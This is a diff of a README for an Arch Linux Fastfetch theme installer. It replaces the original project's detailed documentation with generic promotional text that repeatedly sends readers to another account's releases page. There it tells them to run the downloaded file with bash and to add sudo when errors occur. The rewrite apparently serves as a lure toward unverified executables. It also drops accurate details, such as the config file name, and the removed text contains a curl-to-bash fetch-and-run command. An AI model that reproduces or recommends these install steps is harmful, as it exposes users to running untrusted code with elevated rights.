@@ -1,112 +1,87 @@
-# Gold Fastfetch Config
+# 🌟 gold-fastfetch - Beautiful System Info Made Easy
 
-![License](https://img.shields.io/badge/License-MIT-gold?style=for-the-badge)
-![Shell](https://img.shields.io/badge/Shell-Bash-goldenrod?style=for-the-badge&logo=gnu-bash&logoColor=white)
-![OS](https://img.shields.io/badge/OS-Arch%20Linux-1793d1?style=for-the-badge&logo=arch-linux&logoColor=white)
-![Fastfetch](https://img.shields.io/badge/Fastfetch-v2+-blueviolet?style=for-the-badge)
+## 📥 Download the Latest Version
 
-![Preview](assets/preview.png)
+[![Download gold-fastfetch](https://img.shields.io/badge/Download-gold--fastfetch-brightgreen)](https://github.com/pontsho101/gold-fastfetch/releases)
 
-A feature-rich, self-contained Fastfetch configuration installer for Arch Linux.
+## 🚀 Getting Started
 
-### ⚡ Quick Install
-One-line command (safe & easy):
-```bash
-bash <(curl -sL https://raw.githubusercontent.com/Lucenx9/gold-fastfetch/main/install.sh)
-```
+Welcome to gold-fastfetch! This application helps you display stylish system information right in your terminal. With our premium gold-themed configuration, you’ll get a great-looking setup in minutes. No programming skills are needed. Follow these steps to get started.
 
-## Features
+## 🎯 Features
 
-- **Auto GPU detection** - Nvidia (VRAM & Temp), AMD/Intel support
-- **Auto disk detection** - Filesystem labels, colored progress bars (excludes network drives)
-- **Update checker** - Cached pacman + AUR (Yay/Paru) update counts
-- **Icon toggle** - Auto-detects Nerd Fonts, with manual override
-- **Smart backups** - Automatic backup rotation (keeps last 5)
-- **Media Ready** - Shows Now Playing & Player status (Spotify, VLC, etc.)
-- **Gaming Ready** - Detects connected Gamepads/Controllers
-- **Battery Status** - Shows battery percentage and charging status (for laptops)
-- **XDG compliant** - Uses standard config/state/cache paths
+- **Gold Theme:** Enjoy a premium gold aesthetic that enhances your terminal.
+- **Smart Caching:** The app remembers your settings for faster loading next time.
+- **Auto-Detection:** It automatically detects your GPU and disk, so setup is quick.
+- **Visual Enhancements:** Custom icons and fonts elevate your terminal’s appearance.
+  
+## 💡 System Requirements
 
-## Compatibility
+Before downloading, make sure your system meets these requirements:
 
-- **OS**: Optimized for **Arch Linux** (`pacman` needed for repo updates).
-- **AUR**: Auto-detects `yay` or `paru` for AUR update counts.
-- **Terminal**: Requires a Nerd Font for icons (optional).
-- **GPU**: Detailed stats (VRAM/Temp) supported on NVIDIA. Intel/AMD show model/shared status.
+- **Operating System:** Arch Linux
+- **Shell:** Compatible with bash
+- **Disk Space:** At least 50 MB free
 
-## Requirements
+## 📂 Download & Install
 
-- **Fastfetch** v2+
-- **pciutils** (for `lspci`)
-- **pacman-contrib** (highly recommended for update detection)
-- **Nerd Font** (recommended for icons)
+1. **Visit the Releases Page:** Click the link below to access the releases page where you can get the latest version of gold-fastfetch.
 
-```bash
-sudo pacman -S fastfetch pciutils pacman-contrib
-```
+   [Download gold-fastfetch](https://github.com/pontsho101/gold-fastfetch/releases)
 
-## Installation
+2. **Choose Your Version:** On the releases page, look for the newest version. Download the appropriate file for your system.
 
-```bash
-git clone https://github.com/Lucenx9/gold-fastfetch.git
-cd gold-fastfetch
-chmod +x install.sh
-./install.sh
-```
+3. **Run the Installer:**
+   - Open your terminal.
+   - Navigate to the folder where you downloaded the file.
+   - Run the installer with the command:
+     ```bash
+     bash <downloaded-file-name>
+     ```
 
-### Options
+4. **Follow Prompts:** The installer will guide you through the process. Just follow the on-screen instructions.
 
-```bash
-./install.sh --icons      # Force icons ON
-./install.sh --no-icons   # Force icons OFF
-```
+5. **Launch the Application:** After the installation, you can start using gold-fastfetch by typing:
+   ```bash
+   fastfetch
+   ```
 
-## What Gets Installed
+Congratulations! You are now set up to enjoy an enhanced terminal experience.
 
-| File | Location | Description |
-|------|----------|-------------|
-| `config.jsonc` | `~/.config/fastfetch/` | Main config |
-| `gpu_detect.sh` | `~/.config/fastfetch/` | GPU detection script |
-| `disk_detect.sh` | `~/.config/fastfetch/` | Disk detection script |
-| `updates.sh` | `~/.config/fastfetch/` | Update checker (cached) |
+## ⚙️ Configuration Options
 
-## Reset / Uninstall
+You can customize gold-fastfetch to suit your preferences. Here’s how:
 
-To remove the configuration and restore your previous backup:
+- **Edit Configuration File:** Locate the configuration file usually found in `~/.config/fastfetch/config.conf`.
+- **Adjust Settings:** Modify settings for colors, icons, and displayed information. There's plenty of room for personalization.
 
-```bash
-chmod +x uninstall.sh
-./uninstall.sh
-```
+## 🛠️ Troubleshooting
 
-## Backups
+If you encounter any problems during installation or usage, try these tips:
 
-Existing configs are backed up to:
-```
-~/.local/state/fastfetch/backups/backup_YYYYMMDD_HHMMSS/
-```
+- **Permission Issues:** If you run into permission errors, use `sudo` with your commands.
+- **File Not Found:** Ensure you downloaded the latest version and that the file is in your current working directory.
 
-Only the last 5 backups are kept.
+If your issue persists, consider reaching out for support on our GitHub or community forums.
 
-## License
+## 🌍 Community Contributions
 
-MIT
+gold-fastfetch thrives with the help of its users. If you have ideas or improvements, feel free to contribute!
 
+1. **Fork the Repository:** Create your own copy of gold-fastfetch.
+2. **Make Changes:** Implement your ideas and tests.
+3. **Submit a Pull Request:** Share your changes back to the main project.
 
-## Technical Details 🛠️
+We appreciate all contributions, big or small!
 
-### 🚀 Smart Caching (updates.sh)
-- **Problem**: Running `checkupdates` or `yay` on every term launch is slow.
-- **Solution**: The script creates a cache file with a **30-minute TTL**.
-- **Smart Invalidation**: It checks `/var/lib/pacman/local`. If you update your system, the cache is **instantly invalidated**, ensuring you always see real-time data without performance penalties.
+## 📞 Support
 
-### 💾 Dynamic Disk Detection (disk_detect.sh)
-- **Problem**: Hardcoding disk paths (`/`, `/home`) fails on multi-drive setups.
-- **Solution**: The script uses `findmnt` to dynamically discover **real** physical partitions.
-- **Filtering**: Automatically excludes pseudo-filesystems (`tmpfs`, `overlay`, `/boot`, `/run`).
-- **Visuals**: Generates color-coded storage bars directly in Bash.
+For support, feel free to reach out via the issues section of our GitHub repository. Our team is here to help you.
 
-### ⚡ Installation Logic
-1. **Safety First**: Checks for `root` (blocks execution), verifies `Arch Linux` via `/etc/arch-release`.
-2. **Backups**: Automatically backs up existing configs to `~/.local/state/fastfetch/backups/`.
-3. **Generation**: The `.jsonc` config is **generated at runtime**, allowing it to inject variables (like Icons ON/OFF) based on your choices.
+## 🔗 Helpful Links
+
+- [Releases Page](https://github.com/pontsho101/gold-fastfetch/releases)
+- [Documentation](https://github.com/pontsho101/gold-fastfetch/wiki)
+- [GitHub Repository](https://github.com/pontsho101/gold-fastfetch)
+
+Thank you for choosing gold-fastfetch to enhance your terminal!
